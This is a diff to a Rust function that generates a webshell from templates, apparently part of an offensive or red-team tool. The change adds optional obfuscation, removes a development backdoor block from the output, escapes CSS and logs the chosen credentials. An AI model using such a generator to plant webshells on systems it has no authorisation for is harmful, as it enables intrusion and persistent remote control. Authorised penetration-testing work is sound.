@@ -34,7 +34,7 @@ pub fn generate_webshell(args: &CliArguments) -> anyhow::Result<()> {
 			Ok(css_content) => {
 				css = css_content;
 			}
-			Err(e) => {
+			Err(_) => {
 				warn!("Could not read the template CSS file: {}. Continuing without CSS.", css_path.display());
 			}
 		}
@@ -50,7 +50,7 @@ pub fn generate_webshell(args: &CliArguments) -> anyhow::Result<()> {
 			Ok(js_content) => {
 				js = js_content;
 			}
-			Err(e) => {
+			Err(_) => {
 				warn!("Could not read the template JS file: {}. Continuing without JS.", js_path.display());
 			}
 		}
@@ -80,7 +80,7 @@ pub fn generate_webshell(args: &CliArguments) -> anyhow::Result<()> {
 
 	for placeholder in unique_strings.iter() {
 		let value = match placeholder.as_str() {
-			"__CSS__" => css.clone(),
+			"__CSS__" => css.replace("\"", "\\\"").replace("'", "\\'"),
 			"__JS__" => js.clone(),
 			"__USERNAME__" => hashed_username.to_string(),
 			"__PASSWORD__" => hashed_password.to_string(),
@@ -96,13 +96,22 @@ pub fn generate_webshell(args: &CliArguments) -> anyhow::Result<()> {
 
 		code = code.replace(placeholder, &value);
 	}
-	code = minify(&code);
+
+	let drop_template_development_backdoor = Regex::new(r#"//\s*TEMPLATE DEVELOPMENT BACKDOOR - START(\s|.)*?//\s*TEMPLATE DEVELOPMENT BACKDOOR - END"#).unwrap();
+	code = drop_template_development_backdoor.replace_all(code.as_str(), "").to_string();
+
+	if args.obfuscate {
+		info!("Obfuscating the generated code");
+		code = minify(&code);
+	}
 
 	let output_path = PathBuf::from(args.output.as_ref().unwrap());
 	std::fs::write(&output_path, code)
 		.with_context(|| format!("Could not write the output file: {}", output_path.display()))?;
 
 	info!("Webshell generated successfully: {}", output_path.display());
+	info!("Username: {}", args.username.as_ref().unwrap());
+	info!("Password: {}", args.password.as_ref().unwrap());
 
 	Ok(())
 }
